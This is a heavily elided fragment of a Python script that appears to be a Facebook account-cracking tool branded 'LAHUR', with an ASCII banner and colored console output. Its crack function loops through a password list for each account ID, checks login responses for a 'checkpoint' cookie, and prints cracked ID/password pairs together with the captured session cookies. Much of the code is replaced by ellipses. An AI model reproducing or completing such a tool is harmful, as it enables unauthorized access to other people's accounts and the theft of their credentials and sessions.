...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mLAHUR')
...
#------------------[ MAIN ]-----------------#
  ...
  _____  ______ _______    ___          __     _   _ 
 |  __ \|  ____|___  / |  | \ \        / /\   | \ | |
 | |__) | |__     / /| |__| |\ \  /\  / /  \  |  \| |
 |  _  /|  __|   / / |  __  | \ \/  \/ / /\ \ | . ` |
 | | \ \| |____ / /__| |  | |  \  /\  / ____ \| |\  |
...
def passwrd():
	...
	print(f'{h}[{h}💚{h}]{h} LAHUR : {h}%s '%(ok))
	input('CLICK ENTER TO EXIT ')
		
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo}[LAHUR-😝] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#Tutul-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•LAHUR-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
